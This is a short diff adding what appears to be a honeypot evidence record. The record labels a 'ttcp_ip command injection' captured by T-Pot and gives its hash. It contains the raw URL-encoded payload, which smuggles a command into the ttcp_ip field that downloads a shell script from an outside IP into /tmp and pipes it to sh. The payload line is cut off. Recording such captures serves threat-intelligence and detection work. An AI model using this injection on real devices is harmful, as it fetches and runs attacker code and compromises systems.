@@ -1,0 +1,5 @@
+SHA256: 0a763770245d7ec7eb07c6d4ee7019eb7e91e66d425ae60d976c75c6221dfd29
+Pattern: ttcp_ip command injection
+Evidence source: T-Pot inbound payload
+
+ttcp_num=3&ttcp_size=3&ttcp_ip=-h+%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bbusybox%
